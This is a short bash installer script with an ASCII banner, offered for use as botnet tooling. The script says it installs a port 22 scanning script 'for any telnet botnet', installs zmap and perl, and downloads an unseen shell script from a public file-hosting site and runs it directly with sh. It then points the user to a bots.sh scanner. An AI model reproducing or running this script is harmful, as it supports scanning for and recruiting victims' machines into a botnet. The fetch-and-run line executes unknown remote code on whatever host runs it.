#!/bin/bash
export PYTHONIOENCODING=utf8
echo "$(tput setaf 5)   _¦¦¦¦¦¦¦¦  _¦¦¦¦¦¦¦¦    _¦¦¦¦¦¦¦¦ ¦¦¦____   "
echo "$(tput setaf 5)  ¦¦¦    ¦¦¦ ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦ ¦¦¦¯¯¯¦¦_ "
echo "$(tput setaf 5)  ¦¦¦    ¦¯  ¦¦¦    ¦¯    ¦¦¦    ¦¦¦ ¦¦¦   ¦¦¦ "
echo "$(tput setaf 5)  ¦¦¦        ¦¦¦          ¦¦¦    ¦¦¦ ¦¦¦   ¦¦¦ "
echo "$(tput setaf 5)¯¦¦¦¦¦¦¦¦¦¦¦ ¦¦¦        ¯¦¦¦¦¦¦¦¦¦¦¦ ¦¦¦   ¦¦¦ "
echo "$(tput setaf 5)         ¦¦¦ ¦¦¦    ¦_    ¦¦¦    ¦¦¦ ¦¦¦   ¦¦¦ "
echo "$(tput setaf 5)   _¦    ¦¦¦ ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦ ¦¦¦   ¦¦¦ "
echo "$(tput setaf 5) _¦¦¦¦¦¦¦¦¯  ¦¦¦¦¦¦¦¦¯    ¦¦¦    ¦¯   ¯¦   ¦¯  "
echo "$(tput setaf 7)This script automatically installs a port 22 scanning script for any telnet botnet"
echo "$(tput setaf 7)Please consider checking out my other scripts"
echo "$(tput setaf 7)Made with love - fed"
apt-get install curl
yum install perl -y
curl 'https://s1.fileditch.ch/rXLRPkAqSNvwmdgRxkRs.sh' > zmap_auto_install.sh
sh zmap_auto_install.sh
apt-get install zmap
echo "$(tput setaf 7)Script installed successfully"
echo "$(tput setaf 7)run sh bots.sh to scan"